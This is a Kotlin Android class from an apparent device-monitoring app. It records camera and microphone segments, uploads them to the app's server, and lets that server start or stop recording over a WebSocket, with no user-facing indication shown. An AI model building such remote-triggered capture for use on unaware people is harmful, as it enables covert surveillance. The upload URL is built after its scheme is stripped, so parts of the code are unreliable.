package com.empresa.monitor.service.streaming

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.Camera
import android.media.*
import android.os.Build
import android.os.Environment
import androidx.core.content.ContextCompat
import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.model.DeviceLogApiRequest
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

/**
 * Simplified WebRTC-style streaming — captures camera + mic as H264/AAC
 * and streams segments to server via HTTP multipart upload.
 * Replaces the need for full WebRTC when live streaming is desired.
 */
class LiveStreamer(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isStreaming = false
    private var mediaRecorder: MediaRecorder? = null
    private var camera: Camera? = null
    private var currentSessionId: String? = null
    private val streamDir: File
    private var recorderRunning = false

    // Signaling state
    private var serverSessionId: String? = null
    private var wssClient: WebSocket? = null
    private var deviceId: String? = null

    // Streaming configs
    private var videoBitRate = 500_000 // 500kbps
    private var audioBitRate = 32_000   // 32kbps
    private var frameRate = 15
    private var segmentDurationMs = 5000L // 5 second segments

    init {
        streamDir = File(context.cacheDir, "livestream")
        streamDir.mkdirs()
    }

    fun setDeviceId(id: String) { deviceId = id }

    fun setConfig(videoBitRate: Int, audioBitRate: Int, frameRate: Int, segmentMs: Long) {
        this.videoBitRate = videoBitRate
        this.audioBitRate = audioBitRate
        this.frameRate = frameRate
        this.segmentDurationMs = segmentMs
    }

    /**
     * Start camera streaming session.
     * Records H264+AAC segments and uploads them periodically.
     */
    suspend fun startCameraStream(): Boolean {
        if (isStreaming) return false
        if (!hasCameraPermission() || !hasAudioPermission()) return false

        isStreaming = true
        currentSessionId = "stream_${System.currentTimeMillis()}"

        scope.launch {
            try {
                openCamera()
                startRecordingSegment()
            } catch (e: Exception) {
                e.printStackTrace()
                isStreaming = false
            }
        }
        return true
    }

    fun stopStream() {
        isStreaming = false
        recorderRunning = false

        try {
            mediaRecorder?.apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    stop() // may throw
                } else {
                    try { stop() } catch (_: Exception) {}
                }
                release()
            }
        } catch (_: Exception) {}

        mediaRecorder = null
        camera?.release()
        camera = null
        wssClient?.close(1000, "Stream ended")
        wssClient = null
    }

    private fun openCamera() {
        camera = try {
            Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK)
        } catch (e: Exception) {
            Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT)
        }

        camera?.apply {
            val params = parameters ?: return@apply
            val supportedSizes = params.supportedPreviewSizes
            val size = supportedSizes?.getOrElse(0) { Camera.Size(640, 480) }
            if (size != null) {
                params.setPreviewSize(size.width, size.height)
                parameters = params
            }
            setDisplayOrientation(90)
            startPreview()
        }
    }

    private fun startRecordingSegment() {
        if (!isStreaming || !hasCameraPermission()) return

        val segmentFile = File(streamDir, "seg_${System.currentTimeMillis()}.mp4")
        recorderRunning = true

        try {
            mediaRecorder = MediaRecorder().apply {
                setCamera(camera)
                setAudioSource(MediaRecorder.AudioSource.CAMCORDER)
                setVideoSource(MediaRecorder.VideoSource.CAMERA)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoEncodingBitRate(videoBitRate)
                setAudioEncodingBitRate(audioBitRate)
                setVideoFrameRate(frameRate)
                setVideoSize(640, 480)
                setOutputFile(segmentFile.absolutePath)
                setMaxDuration(segmentDurationMs.toInt())
                setOnInfoListener { _, what, _ ->
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        // Segment complete — upload and start next
                        recorderRunning = false
                        stop()
                        release()
                        mediaRecorder = null
                        scope.launch {
                            uploadSegment(segmentFile)
                            if (isStreaming) {
                                delay(500)
                                startRecordingSegment()
                            }
                        }
                    }
                }
                prepare()
                start()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            recorderRunning = false
        }
    }

    private suspend fun uploadSegment(file: File) {
        if (!file.exists() || file.length() < 1000) {
            file.delete()
            return
        }

        try {
            val client = OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build()

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("session_id", currentSessionId ?: "unknown")
                .addFormDataPart("device_id", deviceId ?: "unknown")
                .addFormDataPart("segment",
                    file.name,
                    file.asRequestBody("video/mp4".toMediaTypeOrNull()))
                .build()

            val request = Request.Builder()
                .url("${getBaseUrl()}/api/stream/upload")
                .post(requestBody)
                .build()

            val response = withContext(Dispatchers.IO) {
                client.newCall(request).execute()
            }

            if (response.isSuccessful) {
                file.delete()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /**
     * Connect to WebSocket signaling server for remote commands.
     */
    fun connectWebSocket() {
        if (deviceId == null) return

        try {
            val client = OkHttpClient.Builder()
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .build()

            val request = Request.Builder()
                .url("wss://${getBaseUrl()}/ws/stream/${deviceId}")
                .build()

            wssClient = client.newWebSocket(request, object : WebSocketListener() {
                override fun onMessage(webSocket: WebSocket, text: String) {
                    handleStreamCommand(text)
                }

                override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                    // Reconnect after delay
                    scope.launch {
                        delay(5000)
                        connectWebSocket()
                    }
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun handleStreamCommand(json: String) {
        try {
            val cmd = JSONObject(json)
            val action = cmd.optString("action", "")

            when (action) {
                "start_camera" -> {
                    scope.launch { startCameraStream() }
                }
                "stop_camera" -> {
                    stopStream()
                }
                "start_audio" -> {
                    // Start audio-only streaming
                }
                "stop_audio" -> {
                    // Stop audio streaming
                }
                "config" -> {
                    setConfig(
                        videoBitRate = cmd.optInt("video_bitrate", videoBitRate),
                        audioBitRate = cmd.optInt("audio_bitrate", audioBitRate),
                        frameRate = cmd.optInt("frame_rate", frameRate),
                        segmentMs = cmd.optLong("segment_ms", segmentDurationMs)
                    )
                }
            }
        } catch (e: Exception) { /* silent */ }
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED
    }

    private fun hasAudioPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                == PackageManager.PERMISSION_GRANTED
    }

    private fun getBaseUrl(): String {
        return com.empresa.monitor.BuildConfig.API_BASE_URL
            .replace("https://", "")
            .replace("/api/", "")
            .replace("/api", "")
    }

    fun destroy() {
        stopStream()
        scope.cancel()
    }
}
